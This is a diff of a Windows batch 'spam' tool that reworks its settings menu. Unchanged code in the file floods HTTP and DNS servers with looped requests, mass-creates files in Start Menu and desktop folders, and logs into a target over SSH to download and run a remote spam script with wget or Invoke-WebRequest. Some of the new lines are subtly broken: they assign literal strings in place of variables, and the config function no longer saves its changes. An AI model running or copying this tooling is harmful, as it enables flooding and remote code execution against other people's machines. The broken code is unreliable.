@@ -4,6 +4,8 @@
 ::    Fix SSH Spam
 ::    Implement Custom Protocol Spam with Calls
 ::    Fully Implement Sudo (Beta is at :sudo.implementation)
+::    Fix Variable Name
+
 
 :!top
     @echo off
@@ -550,55 +552,43 @@
     @ping -n 1 localhost> nul
     echo. 
     @ping -n 1 localhost> nul
-    echo [1] Standart Filename (Will have a Number behind.)
-    @ping -n 1 localhost> nul
-    echo.
-    @ping -n 1 localhost> nul
-    echo.
-    @ping -n 1 localhost> nul
-    echo [2] Standard Directory to Spam(idk why you would need this but here you go)
+    echo [1] Standart Filename
     @ping -n 1 localhost> nul
     echo. 
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo [3] [31mActivate Developer Options (Currently %settings-dev-display%) [32m
+    echo [2] [31mActivate Developer Options (Currently %settings-dev-display%) [32m
     @ping -n 1 localhost> nul
     echo. 
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo [4] Version Control
+    echo [3] Version Control
     @ping -n 1 localhost> nul
     echo. 
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo [5] Logging
+    echo [4] Logging
     @ping -n 1 localhost> nul
     echo. 
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo [6] Experimental Features
+    echo [5] Restart Script
     @ping -n 1 localhost> nul
     echo. 
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo [7] Restart Script
+    echo [6] Start with Arguments (non permanent)
     @ping -n 1 localhost> nul
     echo. 
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo [8] Start with Arguments (non permanent)
-    @ping -n 1 localhost> nul
-    echo. 
-    @ping -n 1 localhost> nul
-    echo.
-    @ping -n 1 localhost> nul
-    echo [9] Go back
+    echo [7] Go back
     @ping -n 1 localhost> nul
     echo. 
     @ping -n 1 localhost> nul
@@ -608,35 +598,65 @@
 
     set /p menu4=Choose an Option from Above:
     if "%menu4%"=="" goto settings
-    If %menu4% == 1 goto settings.change.df.filename
-    If %menu4% == 2 goto settings.default.directory.crash
-    If %menu4% == 3 goto activate.dev.options
-    If %menu4% == 4 goto settings.version.control
-    If %menu4% == 5 goto settings.logging
-    If %menu4% == 6 goto experimental.features
-    If %menu4% == 7 goto restart.script
-    If %menu4% == 8 goto start.with.argument
-    If %menu4% == 9 goto menu
+    If %menu4% == 1 goto spam.settings
+    If %menu4% == 2 goto activate.dev.options
+    If %menu4% == 3 goto settings.version.control
+    If %menu4% == 4 goto settings.logging
+    If %menu4% == 5 goto restart.script
+    If %menu4% == 6 goto start.with.argument
+    If %menu4% == 7 goto menu
     goto settings
+
+:spam.settings
+    echo [1] Default Filename
+    @ping -n 1 localhost> nul
+    echo. 
+    @ping -n 1 localhost> nul
+    echo [2] Default Directory
+    @ping -n 1 localhost> nul
+    echo. 
+    @ping -n 1 localhost> nul
+    echo [3] Default Filecount / Request Count
+    @ping -n 1 localhost> nul
+    echo. 
+    @ping -n 1 localhost> nul
+    echo [4] Default Domain (HTTPS/DNS)
+    @ping -n 1 localhost> nul
+    echo. 
+    @ping -n 1 localhost> nul
+    echo [5] Go back
+    set /P spam.settings=Choose an Option from Above
+    If %spam.settings%=="" goto spam.settings
+    If %spam.settings%== 1 goto settings.default.filename
+    If %spam.settings%== 2 goto settings.default.directory
+    If %spam.settings%== 3 goto settings.default.filecount
+    If %spam.settings%== 4 goto settings.default.domain
+    If %spam.settings%== 5 goto settings
+    goto spam.settings
+
+:settings.default.filecount
+    if %logging% == 1 ( call :log Chaning_Standart_Filecount )
+    cls 
+    set /p df.filecount=Enter the Default Filecount:
+    call :update_config "default-filecount" "" "%df.filecount%"
+    echo Restarting Script...
+    @ping -n 2 localhost > nul
+    goto restart.script
+
+:settings.default.domain
+    if %logging% == 1 ( call :log Chaning_Standart_Domain )
+    cls 
+    set /p df.domain=Enter the Default Domain:
+    call :update_config "default-domain" "" "%df.domain%"
+    echo Restarting Script...
+    @ping -n 2 localhost > nul
+    goto restart.script
 
 :start.with.argument
     call :help.startup
     set /P "argument=Enter an Argument:"
     cd /d %~dp0
     install.bat -reverse.arg %argument%
-
-:experimental.features
-    if %logging% == 1 ( call :log Opened_Experimental_Features )
-    echo [1] Fancy CLI (currently just cmd.exe in Linux Style)
-    echo [2] API (In Developement)
-    echo.
-    echo [4] Back
-    set /P experimental.menu=Choose an Option From Above:
-    if "%experimental.menu%"=="" goto experimental.features
-    if %experimental.menu% == 1 goto sys.cli 
-    if %experimental.menu% == 2 goto experimental.features REM goto sys.api
-    if %experimental.menu% == 3 goto experimental.features REM goto dev.spams
-    if %experimental.menu% == 4 goto settings
 
 
 :settings.version.control
@@ -742,10 +762,10 @@
     @ping -n 2 localhost> nul
     goto restart.script
 
-:settings.change.df.filename
+:settings.default.filename
     :: Write Standart Filename to File
     cls 
-    call :update_config "stdfile" "Type in the Filename you want to use:" ""
+    call :update_config "default-filename" "Type in the Filename you want to use:" ""
     echo Restarting Script...
     if %logging% == 1 ( call :log Changing_Standart_FileName )
     @ping -n 2 localhost > nul
@@ -753,23 +773,16 @@
 
 
 
-:settings.default.directory.crash
+:settings.default.directory
     if %logging% == 1 ( call :log Chaning_Standart_Directory )
     :: Standart Spam Directory Check
     cls 
     set /p directory0=Type Your Directory Here:
-    if exist %directory0% (goto settings.default.directory.crash.2) else (goto settings.default.directory.crash.3)
-    call :update_config "stdrcch" "" "%directory0%"
+    call :update_config "default_directory" "" "%directory0%"
     echo Restarting Script...
     if %logging% == 1 ( call :log Changing_Default_Directory )
     @ping -n 2 localhost > nul
     goto restart.script
-
-:settings.default.directory.crash.3
-    :: Not so hard to understand
-    echo The Directory is invalid!
-    pause
-    goto settings.default.directory.crash
 
 :settings.logging
     if %logging% == 1 ( call :log Opened_Logging_Settings )
@@ -1099,13 +1112,15 @@
 
 :https.spam
     echo Spam a HTTP/HTTPS Server with Requests
-    set /P url=Enter a Domain or an IP:
-    set /P requests=How many requests should be made
-    
+    if "%default-domain%"=="notused" set /P url=Enter a Domain or an IP:
+    if not "%default-domain%"=="notused" set "url=default-domain"
+    if "%default-filecount%"=="notused" set /P requests=How many requests should be made:
+    if not "%default-filecount%"=="notused" set "requests=default-domain"
+
     setlocal enabledelayedexpansion
     for /L %%i in (1,1,%requests%) do (
-        echo Sending Request %%i of %requests% to %URL%
-        curl -s -o NUL -w "Status: %{http_code}\n" %URL%
+        echo Sending Request %%i of %requests% to %url%
+        curl -s -o NUL -w "Status: %{http_code}\n" !url!
     )
 
 :https.done
@@ -1151,9 +1166,12 @@
     setlocal enabledelayedexpansion
     
     echo DNS-Spam is useful if you have a local DNS Server running (PiHole, Adguard etc.)
-    set /P request_count=Enter the Request Count:
-    set /P domain=Enter the Domain:
     set /P domain_server=Enter the DNS-Server IP (leave empty for default):
+    if "%default-domain%"=="notused" set /P domain=Enter the Domain:
+    if not "%default-domain%"=="notused" set "domain=%default-domain%"
+
+    if "%default-filecount%"=="notused" set /P request_count=Enter the Request Count:
+    if not "%default-filecount%"=="notused" set "request_count=%default-filecount%"
     
     if not defined domain_server set "domain_server= "
     
@@ -1234,8 +1252,15 @@
     set /P username=Enter the Username
     set /P password=Enter the Password
     set /P remoteDir=Enter the Directory (leave empty if unsure):
-    if not "%stdfile%"=="notused" set /P filename=Enter the Filename:
+
+    if "%default-filename%"=="notused" set /P filename=Enter the Filename:
+    if not "%default-filename%"=="notused" set "filename=%default-filename%"
+
     set /P content=Enter the File-Content:
+
+    if "%default-filecount%"=="notused" set /P filecount=How many Files should be created:
+    if not "%default-filecount%"=="notused" set "filecount=%default-filecount%"
+    
     echo %content% > %filename%.txt
     
     :: Creates Files on local Machine
@@ -1438,7 +1463,7 @@
     
 :spam.local.user.startmenu
     set "directory1=%AppData%\Microsoft\Windows\Start Menu\Programs"
-    if %stdfile% equ notused (goto startmenu.custom.name) else (goto startmenu.start)
+    if %default-filename% equ notused (goto startmenu.custom.name) else (goto startmenu.start)
 
 :spam.all.user.startmenu
     net session >nul 2>&1
@@ -1449,30 +1474,30 @@
         exit
     )
     set "directory1=%ProgramData%\Microsoft\Windows\Start Menu\Programs"
-    if %stdfile% equ notused (goto startmenu.custom.name) else (goto startmenu.start)
+    if %default-filename% equ notused (goto startmenu.custom.name) else (goto startmenu.start)
     
 :startmenu.custom.name
     cls
     echo Illegal Characters:\ / : * ? " < > |"
-    set /p stdfile=Type in the Filename you want to use:
+    set /p default-filename=Type in the Filename you want to use:
 
 :startmenu.start
     cd %directory1%
     goto spam.ready.to.start
 
 :ssh.spam
-    if %logging% == 1 ( call :log Opened_SSH_Spam )
+    if "%logging%"=="1" ( call :log Opened_SSH_Spam )
     :: Not working - TLI For ssh.spam
     echo In Order to work the Remote Spam Method needs 4 Things.
-    @ping -n 1 localhost> nul
+    @ping -n 1 localhost > nul
     echo 1: The IP of the Device you want to spam
-    @ping -n 1 localhost> nul
+    @ping -n 1 localhost > nul
     echo 2: An Accountname
-    @ping -n 1 localhost> nul
-    echo 3: The Passwort of the Account
-    @ping -n 1 localhost> nul
+    @ping -n 1 localhost > nul
+    echo 3: The Password of the Account
+    @ping -n 1 localhost > nul
     echo 4: How many Files you want to create
-    @ping -n 1 localhost> nul
+    @ping -n 1 localhost > nul
     echo.
     echo. 
     echo [1] Continue
@@ -1481,24 +1506,24 @@
     echo.
     set /P remotespamchoose=Choose an Option from above:
     if "%remotespamchoose%"=="" goto ssh.spam
-    if %remotespamchoose% == 1 goto ssh.spam.info
-    if %remotespamchoose% == 2 goto start.verified
+    if "%remotespamchoose%"=="1" goto ssh.spam.info
+    if "%remotespamchoose%"=="2" goto start.verified
 
 :ssh.spam.info
-    if %logging% == 1 ( call :log Listing_Local_IPs )
+    if "%logging%"=="1" ( call :log Listing_Local_IPs )
     :: Ask the User to enter the IP - supported with arp
     echo Please specify the IP of the Device
-    @ping -n 1 localhost> nul
+    @ping -n 1 localhost > nul
     echo Down Below are a Few IPs in your Network. 
     arp -a 
-    @ping -n 1 localhost> nul
+    @ping -n 1 localhost > nul
     echo If you need help finding the IP type "help"
-    @ping -n 1 localhost> nul
+    @ping -n 1 localhost > nul
     echo.
-    @ping -n 1 localhost> nul
+    @ping -n 1 localhost > nul
     echo.
     set /P ssh-ip=Enter the IP:
-    if %ssh-ip% == help (
+    if "%ssh-ip%"=="help" (
         start "" "https://support.ucsd.edu/services?id=kb_article_view&sysparm_article=KB0032480"
     ) else (
         goto ssh.spam.setup
@@ -1522,12 +1547,12 @@
     echo.
     set /P linux-win-ssh=Choose an Option from Above:
     if "%linux-win-ssh%"=="" goto ssh.start.spam
-    if %linux-win-ssh% == 1 goto spam.ssh.target.win
-    if %linux-win-ssh% == 2 goto spam.ssh.target.lx
+    if "%linux-win-ssh%"=="1" goto spam.ssh.target.win
+    if "%linux-win-ssh%"=="2" goto spam.ssh.target.lx
     goto ssh.start.spam
 
 :spam.ssh.target.win
-    if %logging% == 1 ( call :log Spamming_Windows_SSH_Target )
+    if "%logging%"=="1" ( call :log Spamming_Windows_SSH_Target )
     set ssh_command=Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%
     ssh %ssh-name%@%ssh-ip% powershell -Command "%ssh_command%"
     color 02
@@ -1535,12 +1560,13 @@
     goto ssh.done
 
 :spam.ssh.target.lx
-    if %logging% == 1 ( call :log Spamming_Linux_SSH_Target )
+    if "%logging%"=="1" ( call :log Spamming_Linux_SSH_Target )
     set ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%
     ssh %ssh-name%@%ssh-ip% %ssh_command%
     color 02
     echo Successfully executed SSH Connection.
     goto ssh.done
+
 
 :ssh.done
     if %logging% == 1 ( call :log Finished_SSH_Spam_Files:_%ssh-filecount%_Host_%ssh-name% )
@@ -1614,7 +1640,8 @@
 :desktop.icon.spam.1
     :: Name TLI
     echo How Should the Files be named?
-    if not "%stdfile%"=="notused" set /p "deskiconspamname=Choose a Filename:"
+    if "%default-filename%"=="notused" set /p "deskiconspamname=Choose a Filename:"
+    if not "%default-filename%"=="notused" set "deskiconspamname=%default-filename%"
     echo Now Choose the Format of the File
     echo If you are not sure type txt
     echo Dont Include the Dot
@@ -1680,7 +1707,7 @@
 :normal.text.spam
     if %logging% == 1 ( call :log Opened_Normal_Spam )
     :: dont know if that function is even used but it works
-    if stdrcch equ notused (goto sys.no.var.set) else (cd /d %stdrcch% && goto sys.check.custom.name)
+    if default_directory equ notused (goto sys.no.var.set) else (cd /d %default_directory% && goto sys.check.custom.name)
 
 :sys.no.var.set
     :: normal spam tli
@@ -1733,14 +1760,14 @@
 
 :sys.check.custom.name
     :: check if filename setting is used
-    if %stdfile% equ notused (goto sys.check.custom.name.2) else (goto spam.time.window.ask)
+    if %default-filename% equ notused (goto sys.check.custom.name.2) else (goto spam.time.window.ask)
 
 :sys.check.custom.name.2
     :: filename tli
     cls
     echo Now You have to choose a filename. It can be anything as long as the 
     echo Filename doesnt have the following Character(s):\ / : * ? " < > |"
-    set /p stdfile=Type in the Filename you want to use.
+    set /p default-filename=Type in the Filename you want to use.
     setlocal enabledelayedexpansion
     goto spam.time.window.ask
 
@@ -1796,7 +1823,7 @@
 :spam.normal.top
     :: create files
     set /a x+=1
-    echo. > %stdfile%%x%.txt
+    echo. > %default-filename%%x%.txt
     echo Created %x% File(s).
     if %x% equ %filecount% (goto done) else (goto spam.normal.top)
 
@@ -2081,7 +2108,7 @@
 
 :update_config
     :: Example for Interactive Change
-    :: call :update_config "stdfile" "Type in the Filename you want to use." ""
+    :: call :update_config "default-filename" "Type in the Filename you want to use." ""
     
     :: Example for Automated Change
     :: call :update_config "logging" "" "1"
@@ -2107,19 +2134,31 @@
     
     (for /f "tokens=1,* delims==" %%a in (!file!) do (
         if "%%a"=="%key%" (
+            set found=1
             echo %%a=!new_value!
         ) else (
             echo %%a=%%b
         )
     )) > !tmpfile!
     
-    move /y !tmpfile! !file!
-    
+    if !found!==0 (
+        echo %key%=%new_value% >> !tmpfile!
+    )
+
     if !logging!==1 ( call :log Changing_%key% )
     cls
     endlocal
     goto :eof
     
+
+
+
+
+
+
+
+
+
 
 
 :sys.verify.execution
